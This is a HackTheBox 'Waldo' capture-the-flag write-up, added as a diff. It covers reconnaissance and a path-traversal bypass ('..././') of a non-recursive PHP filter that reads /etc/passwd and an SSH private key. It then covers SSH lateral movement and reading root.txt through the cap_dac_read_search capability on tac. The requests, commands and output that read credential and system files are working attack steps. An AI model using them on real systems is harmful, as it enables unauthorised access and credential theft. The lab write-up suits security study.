@@ -1,0 +1,406 @@
+---
+layout: menu
+title: "HTB Waldo"
+description: "10.10.10.87 | 30 pts"
+header-img: "boxes/screenshots/14_waldo/waldo.jpg"
+tags: [hackthebox, htb, boot2root, writeup, linux, php, str_replace, ssh, private key, private key authentication, identity file, linux capabilities, capabilities, sbin, getcap, waldo]
+---
+
+:filesdir: /boxes/files/14_waldo/
+:imagesdir: /boxes/screenshots/14_waldo
+:page-liquid:
+:source-highlighter: rouge
+
++++<h1 style="color:red">+++ HTB Waldo (10.10.10.87) +++</h1>+++
+
+---
+
+:toc: 
+:toc-title: TABLE OF CONTENTS
+
+---
+
+== PART 1 : INITIAL RECON
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ nmap --min-rate 1000 -p- -v 10.10.10.87
+  
+  PORT   STATE SERVICE
+  22/tcp open  ssh
+  80/tcp open  http
+
+$ nmap -p 22,80 -sC -sV -v 10.10.10.87
+
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
+  | ssh-hostkey: 
+  |   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
+  |   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
+  |_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
+  80/tcp open  http    nginx 1.12.2
+  | http-methods: 
+  |_  Supported Methods: GET HEAD POST
+  |_http-server-header: nginx/1.12.2
+  | http-title: List Manager
+  |_Requested resource was /list.html
+  |_http-trane-info: Problem with XML parsing of /evox/about
+
+----
+____
+
+---
+
+== PART 2 : PORT ENUMERATION
+
+Opening +++<span style="color:orange">+++*`http&#58;//10.10.10.87`*+++</span>+++ brings you to a +++<span style="color:orange">+++List Manager+++</span>+++ page:
+
+____
+image::80_landing_page.png[Landing Page]
+____
+
+It exhibits the following behavior when performing the following actions:
+
+____
+.Opening the +++<span style="color:orange">+++List Manager+++</span>+++ makes a POST request to +++<span style="color:orange">+++*`dirRead.php`*+++</span>+++: 
+
+[source,http]
+----
+POST /dirRead.php HTTP/1.1
+Host: 10.10.10.87
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.87/list.html
+Content-type: application/x-www-form-urlencoded
+Content-Length: 13
+Connection: keep-alive
+    
+path=./.list/
+----
+
+.Opening a list makes a POST request to +++<span style="color:orange">+++*`fileRead.php`*+++</span>+++: 
+
+[source,http]
+----
+POST /fileRead.php HTTP/1.1
+Host: 10.10.10.87
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.87/list.html
+Content-type: application/x-www-form-urlencoded
+Content-Length: 18
+Connection: keep-alive
+
+file=./.list/list1
+----
+____
+
+---
+
+## PART 3 : EXPLOITATION
+
+Attempting to read the contents of +++<span style="color:orange">+++*`dirRead.php`*+++</span>+++ and +++<span style="color:orange">+++*`fileRead.php`*+++</span>+++ by using POST requests:
+
+____
+.+++<span style="color:orange">+++*`dirRead.php`*+++</span>+++:
+
+HTTP Request:
+[source,http]
+----
+POST /fileRead.php HTTP/1.1
+...omitted...
+
+file=./dirRead.php
+----
+HTTP Response:
+[source,json]
+----
+{"file":"<?php\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\tif(isset($_POST['path'])){\n\t\theader('Content-type: application\/json');\n\t\t$_POST['path'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['path']);\n\t\techo json_encode(scandir(\"\/var\/www\/html\/\" . $_POST['path']));\n\t}else{\n\t\theader('Content-type: application\/json');\n\t\techo '[false]';\n\t}\n}\n"}
+----
+____
+____
+.+++<span style="color:orange">+++*`fileRead.php`*+++</span>+++:
+
+HTTP Request:
+[source,http]
+----
+POST /fileRead.php HTTP/1.1
+...omitted...
+
+file=./fileRead.php
+----
+HTTP Response:
+[source,json]
+----
+{"file":"<?php\n\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\t$fileContent['file'] = false;\n\theader('Content-Type: application\/json');\n\tif(isset($_POST['file'])){\n\t\theader('Content-Type: application\/json');\n\t\t$_POST['file'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['file']);\n\t\tif(strpos($_POST['file'], \"user.txt\") === false){\n\t\t\t$file = fopen(\"\/var\/www\/html\/\" . $_POST['file'], \"r\");\n\t\t\t$fileContent['file'] = fread($file,filesize($_POST['file']));  \n\t\t\tfclose();\n\t\t}\n\t}\n\techo json_encode($fileContent);\n}\n"}
+----
+____
+
+It exposes the PHP source code for both files:
+
+____
+.+++<span style="color:orange">+++*`dirRead.php`*+++</span>+++:
+
+[source,php,subs="verbatim,quotes"]
+----
+<?php
+
+if($_SERVER['REQUEST_METHOD'] === "POST"){
+	if(isset($_POST['path'])){
+	    header('Content-type: application/json');
+	    $_POST['path'] = #str_replace( array("../", "..\""), "", $_POST['path']);#
+        #echo json_encode(scandir("/var/www/html/" . $_POST['path']));#
+	}else{
+	    header('Content-type: application/json');
+	    echo '[false]';
+	}
+}
+
+----
+____
+____
+.+++<span style="color:orange">+++*`fileRead.php`*+++</span>+++:
+
+[source,php,subs="verbatim,quotes"]
+----
+<?php
+ 
+ 
+if($_SERVER['REQUEST_METHOD'] === "POST"){
+    $fileContent['file'] = false;
+    header('Content-Type: application/json');
+    if(isset($_POST['file'])){
+        header('Content-Type: application/json');
+        $_POST['file'] = #str_replace( array("../", "..""), "", $_POST['file']);#
+        if(strpos($_POST['file'], "user.txt") === false){
+                $file = #fopen("/var/www/html/" . $_POST['file'], "r");#
+                $fileContent['file'] = fread($file,filesize($_POST['file']));
+                fclose();
+        }
+    }
+    echo json_encode($fileContent);
+} 
+----
+____
+
+From this, we could see that the base directory for the +++<span style="color:orange">+++List Manager+++</span>+++ is at *`/var/www/html`* and reading files outside the directory is prevented by converting +++<span style="color:red">+++*`../`*+++</span>+++ or +++<span style="color:red">+++*`.."`*+++</span>+++ to an empty string. This could be bypassed by instead using +++<span style="color:red">+++*`..././`*+++</span>+++ since functions like this and *`preg_replace()`* are not recursive.
+
+____
+.+++<span style="color:red">+++Now, attempting to read files outside *`/var/www/html`*+++</span>+++:
+
+HTTP Request:
+[source,http]
+----
+POST /fileRead.php HTTP/1.1
+...omitted...
+
+file=..././..././..././etc/passwd
+----
+
+HTTP Response:
+[source,json]
+----
+{"file":"root:x:0:0:root:\/root:\/bin\/ash\nbin:x:1:1:bin:\/bin:\/sbin\/nologin\ndaemon:x:2:2:daemon:\/sbin:\/sbin\/nologin\nadm:x:3:4:adm:\/var\/adm:\/sbin\/nologin\nlp:x:4:7:lp:\/var\/spool\/lpd:\/sbin\/nologin\nsync:x:5:0:sync:\/sbin:\/bin\/sync\nshutdown:x:6:0:shutdown:\/sbin:\/sbin\/shutdown\nhalt:x:7:0:halt:\/sbin:\/sbin\/halt\nmail:x:8:12:mail:\/var\/spool\/mail:\/sbin\/nologin\nnews:x:9:13:news:\/usr\/lib\/news:\/sbin\/nologin\nuucp:x:10:14:uucp:\/var\/spool\/uucppublic:\/sbin\/nologin\noperator:x:11:0:operator:\/root:\/bin\/sh\nman:x:13:15:man:\/usr\/man:\/sbin\/nologin\npostmaster:x:14:12:postmaster:\/var\/spool\/mail:\/sbin\/nologin\ncron:x:16:16:cron:\/var\/spool\/cron:\/sbin\/nologin\nftp:x:21:21::\/var\/lib\/ftp:\/sbin\/nologin\nsshd:x:22:22:sshd:\/dev\/null:\/sbin\/nologin\nat:x:25:25:at:\/var\/spool\/cron\/atjobs:\/sbin\/nologin\nsquid:x:31:31:Squid:\/var\/cache\/squid:\/sbin\/nologin\nxfs:x:33:33:X Font Server:\/etc\/X11\/fs:\/sbin\/nologin\ngames:x:35:35:games:\/usr\/games:\/sbin\/nologin\npostgres:x:70:70::\/var\/lib\/postgresql:\/bin\/sh\ncyrus:x:85:12::\/usr\/cyrus:\/sbin\/nologin\nvpopmail:x:89:89::\/var\/vpopmail:\/sbin\/nologin\nntp:x:123:123:NTP:\/var\/empty:\/sbin\/nologin\nsmmsp:x:209:209:smmsp:\/var\/spool\/mqueue:\/sbin\/nologin\nguest:x:405:100:guest:\/dev\/null:\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/home\/nobody:\/bin\/sh\nnginx:x:100:101:nginx:\/var\/lib\/nginx:\/sbin\/nologin\n"}
+----
+
+File Contents:
+[source,subs="verbatim,quotes"]
+----
+root:x:0:0:root:/root:/bin/ash
+...omitted...
+operator:x:11:0:operator:/root:/bin/sh
+...omitted...
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+...omitted...
+#nobody:x:65534:65534:nobody:/home/nobody:/bin/sh#
+...omitted...
+----
+____
+
+---
+
+## PART 4 : GENERATE USER SHELL
+
+Using the ability to read local files, let's explore the user, +++<span style="color:red">+++*`nobody`*'s+++</span>+++, home directory:
+
+____
+.+++<span style="color:red">+++*`nobody`*'s home directory+++</span>+++
+HTTP Request:
+[source,http]
+----
+POST /dirRead.php HTTP/1.1
+...omitted...
+
+path=..././..././..././home/nobody/
+----
+
+HTTP Response:
+[source,php,subs="verbatim,quotes"]
+----
+[".","..",".ash_history","##.ssh##",".viminfo","user.txt"]
+----
+____
+____
+.+++<span style="color:red">+++The *`.ssh`* directory+++</span>+++
+HTTP Request:
+[source,http]
+----
+POST /dirRead.php HTTP/1.1
+...omitted...
+
+path=..././..././..././home/nobody/.ssh/
+----
+
+HTTP Response:
+[source,php,subs="verbatim,quotes"]
+----
+[".","..","##.monitor##","authorized_keys","known_hosts"]
+----
+____
+____
+.+++<span style="color:red">+++The *`.monitor`* file+++</span>+++
+HTTP Request:
+[source,http]
+----
+POST /fileRead.php HTTP/1.1
+...omitted...
+
+file=..././..././..././home/nobody/.ssh/.monitor
+----
+
+HTTP Response:
+[source,json]
+----
+{"file":"-----BEGIN RSA PRIVATE KEY-----\NMIIEOGIBAAKCAQEAS7SYTDE++NHAWB9E+NN3V5T1DP1TYHC+4O8D362L5NWF6CPL\NMR4JH6N4NCCDM1ZU+QB77LI8ZOVYMBTIEY4FM07X4PQT4ZENBFQKWKOCYV1TLW6F\N87S0FZBHYAIZGRNNELLHB1IZIJPDVJUBSXG6S2CXALE14CJ+PNEIRTSYMIQ1NJCS\NDGCC\/GNPW\/AANIN4VW9KSLLQIAEDJFCHY55SCJ5162Y9+I1XZQF8E9B12WVXIRVN\NO8PLGNFJVW6SHHMPJSUE9VJAIEH+N+5XKBC8\/6PCEOWQS9UJRKNZH9T1LJQ4FX1V\NVI93DAQ3BZ3DHIIWAWAFMQZG+JSTHSWOIWR73WIDAQABAOIBADHWL\/WDMUPEW6KU\NVMZHRU3GCJUZWBET0TNEJBL\/KXNWXR9B2I0DHWFG8IJW1LCU29NV8B+EHGP+BR\/6\NPKHMFP66350XYLNSQISHHIRMOSPYDGQVST4KBCP5VBTTDGC7RZF+EQZYEQFDRKW5\N8KUNPTTMNWWLPYYJLSJMSRSN4BQYT3VRKTYKJ9IGU2RRKGXRNDCAC9EXGRUEVJ3Q\N1H+7O8KGEPMKNEOGUGEJRN69HXYHFBEJ0WLLL8WORT9YUMMOX\/05QOOBL4KQXUM7\NVXI2YWU46+QTZTMEOKJOYLCGLYXDKG5ONDFDPBW3W8O6ULVFKV467M3ZB5YE8GES\NDVA3YLECGYEA7JK51MVUGSIFF6GKXSNB\/W2CZGE9TIXBWUQWEEIG0BMQQVX2ZWWO\NV0OG0X\/IROXACP6Z9WGPIC6FHVGJD\/4BNLTR+A\/LWQWFT1B6L03XDSYAIYIWI9XR\NXSB2SLNWP56A\/5TWTPOKFDBGCQRQHVUKWSHLYFOZGQA0ZTMNV71YKH0CGYEAWSSY\NQFFDAWRVVZJP26YF\/JNZAVLCAC5HMHO7EX5ISCVCX86MHQPEYAFCECZN2DFFOPQI\NYZHZGB9N6Z01YUEKQRKNO3TA6JYJ9OJAMF8GZWVUTPZN41KSND4MWETBED4BUAH1\N\/PACW\/+\/OYSH4BWKKNVHKNW36C+WMNOAX1FWQISCGYBYW\/IMNLA3DRM3CIAA32IU\NLROTP4QGAAMXPNCSMIPAGE6CRFVHIUOZ1SFNBV189Q8ZBM4PXQGKLLOJ8B33HDQ\/\NLNN2N1WYTIYEUGA\/QMDKOPB+TUFF1A5EZZZ0UR5WLLWA5NBEALDNOYTBK1P5N4KP\NW7UYNREX6DGOBT2MD+10CQKBGGVQLYUNE20K9QSHVZTU3E9Z1RL+6LLDMZTFC3G9\N1HLMBKDTJJJ\/XAJAZUIOF4RS\/INNKJ6+QYGKFAPRXXCPF9NACLQJAZGAMXW50AQT\NRJ1BHUCZZCUGQABTPC6VYJ\/HLLLZPIC05AIEHDDVTOPK\/0WUY64FDS0VCCAYMMDR\NX\/PLAOGAS6UHBCM5TWZHTL\/HDPROFAR3QKXWZ5XVAYKB90XGIPS5CWUGCCSVWQF2\NDVVNY8GKBM\/OENWHNTLWRTEJ5QDEAM40OJ\/MWCDC6KPV1LJXRW2R5MCH9ZGBNFLA\NW0IKCBUAM5XZGU\/YSKMSCBMNMA8A5NDRWGFEFE+VGDVPARIE0RO=\N-----END RSA PRIVATE KEY-----\N"}
+----
+____
+
+We get a private key which we then could use to login via SSH with the user, *`nobody`*:
+
+____
+.+++<span style="color:red">+++Fix the permissions of the private key then login+++</span>+++
+
+[source,shell]
+----
+$ chmod 400 .monitor
+
+$ ssh -i .monitor -l nobody 10.10.10.87
+
+$ id 
+  
+  uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+
+$ cat user.txt 
+
+  3276........................9d24
+----
+____
+
+---
+
+## PART 5 : LATERAL MOVEMENT (nobody -> monitor)
+
+There was nothing going on much with the user, +++<span style="color:orange">+++*`nobody`*+++</span>+++, so when I re-examined the +++<span style="color:orange">+++*`.ssh`*+++</span>+++ directory, I noticed something in the +++<span style="color:orange">+++*`authorized_keys`*+++</span>+++ file:
+
+____
+.+++<span style="color:red">+++The *`authorized_keys`* file+++</span>+++:
+
+[source,shell,subs="verbatim,quotes"]
+----
+$ cd ~/.ssh
+
+$ cat authorized_keys
+
+  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgk
+  fqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlR
+  tJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbB
+  VeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+a
+  rOD6NJOFJY4jBHvf #monitor@waldo#
+----
+____
+
+The private key, +++<span style="color:orange">+++*`.monitor`*+++</span>+++, was originally created for the user, +++<span style="color:orange">+++*`monitor`*+++</span>+++ which doesn't seem to be anywhere in this box so I tried to connect to +++<span style="color:orange">+++*`monitor@waldo`*+++</span>+++ from within the current shell using SSH.
+
+____
+.+++<span style="color:red">+++The *`authorized_keys`* file+++</span>+++:
+
+[source,shell]
+----
+$ ssh -i ~/.ssh/.monitor monitor@waldo -t sh
+
+$ id
+
+  uid=1001(monitor) gid=1001(monitor) groups=1001(monitor)
+----
+____
+
+I used the *`-t`* option to force an inactive shell from the connection.
+
+---
+
+## PART 6 : PRIVILEGE ESCALATION (monitor -> root)
+
+Enumerating the system:
+
+____
+.+++<span style="color:red">+++The *`~/bin`* directory+++</span>+++:
+
+[source,shell,subs="verbatim,quotes"]
+----
+$ ls -l
+
+  drwxrwx--- 3 app-dev monitor 4096 May  3  2018 app-dev
+  dr-xr-x--- 2 root    monitor 4096 May  3  2018 #bin#
+
+$ ls -lA ~/bin
+
+  lrwxrwxrwx 1 root root  7 May  3  2018 ls -> /bin/ls
+  lrwxrwxrwx 1 root root 13 May  3  2018 most -> /usr/bin/most
+  lrwxrwxrwx 1 root root  7 May  3  2018 red -> /bin/ed
+  lrwxrwxrwx 1 root root  9 May  3  2018 rnano -> /bin/nano
+
+----
+____
+
+The files are symbolically linked to the *`/bin`* and *`/usr/bin`* directories so they must be standard binaries but maybe they can do much more:
+
+____
+.+++<span style="color:red">+++Binary capabilities+++</span>+++:
+
+[source,shell,subs="verbatim,quotes"]
+----
+$ getcap ~/bin/*
+
+  sh: 8: getcap: not found
+
+$ find / -name getcap 2>/dev/null
+
+  /sbin/getcap
+
+$ /sbin/getcap ~/bin/*
+
+$ /sbin/getcap /usr/bin/*
+
+  /usr/bin/tac = #cap_dac_read_search+ei#
+
+----
+____
+
+The binay, +++<span style="color:orange">+++*`/usr/bin/tac`*+++</span>+++, has the linux capability, +++<span style="color:orange">+++*`cap_dac_read_search`*+++</span>+++ which means it could bypass file read permissions (execute permissions are also bypassed for directories) while +++<span style="color:orange">+++*`+ei`*+++</span>+++ means that the capability is effective and inheritable.
+
+____
+.+++<span style="color:red">+++Reading *`root.txt`*+++</span>+++:
+
+[source,shell,subs="verbatim,quote"]
+----
+$ tac /root/root.txt
+
+  8fb6........................4f6c
+
+----
+____
